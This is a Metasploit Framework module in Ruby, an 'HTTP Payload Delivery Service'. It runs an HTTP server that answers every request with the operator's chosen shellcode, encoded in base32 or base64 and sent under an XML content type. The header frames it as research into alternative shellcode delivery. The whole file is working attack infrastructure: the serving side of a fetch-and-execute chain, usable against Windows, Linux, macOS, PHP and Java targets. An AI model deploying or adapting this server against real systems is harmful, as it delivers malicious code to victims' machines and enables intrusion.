##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking

    include Msf::Exploit::Remote::HttpServer::HTML
    include Msf::Auxiliary::Report

    def initialize
        super(
            'Name'        => 'HTTP Payload Delivery Service',
            'Version'     => '$Revision$',
            'Description'    => %q{
                This module is designed for out-of-band payload delivery.
                When started this module will create an HTTP Server that monitors incoming HTTP(S)
                requests. Once a request is received the module will then encode the chosen payload
                and deliver it back to the source of the request in the response body.

                A client-side script of application is required to make use of this module.
                The server-side portion is made available to allow further research into
                alternative shellcode delivery mechanisms.
            },
            'Author'      => 'Chris John Riley',
            'License'     => MSF_LICENSE,
            'References'    =>
                [
                    # general
                    ['URL', 'http://blog.c22.cc']
                ],
            'Payload'        =>
                    {
                            'Space'       => 1400,
                            'BadChars'    => '',
                            'DisableNops' => true,
                    },
            'Platform'       => [ 'win', 'linux', 'solaris', 'unix', 'osx', 'bsd', 'php', 'java' ],
            'Arch'           => ARCH_ALL,
            'Targets'        => [ [ 'Wildcard Target', { } ] ],
            'DefaultTarget'  => 0
        )

        register_options(
            [
                OptString.new('ENCODING',   [ true, 'Specify base32/base64 encoding', 'base32' ]),
                OptString.new('PREFIX',     [ false, 'Prepend value to shellcode delivery', 'SC' ]),
                OptPort.new('SRVPORT',      [ true, 'The local port to listen on.', 80]),
            ], self.class)

        deregister_options('SNAPLEN','FILTER','PCAPFILE','RHOST','UDP_SECRET','GATEWAY','NETMASK', 'TIMEOUT')
    end

    def on_request_uri(cli, request)
        @encoding = datastore['ENCODING'].downcase
        @prefix = datastore['PREFIX']
        content = @prefix + encodepayload.to_s

        print_status("#{cli.peerhost}:#{cli.peerport} Sending payload ...")
        send_response_html(cli, content, { 'Content-Type' => 'application/xml' })
    end

    def run
        exploit()
    end

    def encodepayload
        # encode payload into Base64/Base32 as required

        p = payload.encoded
        if @encoding == 'base64'
            enc_payload = Rex::Text.encode_base64(p)
            print_status("#{name}: Encoding payload using base64")
            return enc_payload
        elsif @encoding == 'base32'
            enc_payload = Rex::Text.encode_base32(p)
            print_status("#{name}: Encoding payload using base32")
            return enc_payload
        else
            raise RuntimeError , "Invalid encoding type"
        end
    end

end
